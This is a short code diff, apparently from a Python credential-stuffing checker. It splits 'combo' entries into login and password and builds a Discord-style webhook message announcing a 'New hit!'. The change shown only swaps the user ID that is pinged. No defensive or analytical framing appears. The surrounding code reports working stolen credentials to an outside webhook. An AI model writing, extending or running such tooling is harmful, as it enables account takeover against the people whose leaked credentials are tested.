@@ -46,7 +46,7 @@ def remove_combo_from_file(combo):
 def send_webhook_to_another(status, combo):
     credential, password = combo.split(":", 1)
     data = {
-        "content": f"<@541337117826220035>",
+        "content": f"<@506769994630168587>",
         "embeds": [{
             "title": f"New hit!",
             "color": 65280,
